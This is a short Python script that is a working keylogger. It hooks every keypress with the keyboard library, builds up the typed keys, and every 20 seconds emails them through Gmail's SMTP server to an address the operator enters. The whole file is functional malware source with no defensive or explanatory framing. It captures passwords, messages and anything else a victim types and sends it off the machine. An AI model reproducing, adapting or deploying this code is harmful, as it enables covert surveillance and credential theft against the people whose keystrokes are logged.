
import smtplib
import keyboard
from threading import Timer

email = input("your_email@example.com: ")
password = input("your_password: ")
to_email = input("receiver_email@example.com: ")

interval = 20

logged_keys = ""


def send_logs():
    global logged_keys
    if logged_keys:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)


            server.sendmail(email, to_email, logged_keys)
            logged_keys = ""

            server.quit()
        except Exception as e:
            print("An error occurred while sending the logs:", str(e))

    timer = Timer(interval, send_logs)
    timer.start()

def on_key_press(event):
    global logged_keys
    logged_keys += event.name

keyboard.on_press(on_key_press)

send_logs()
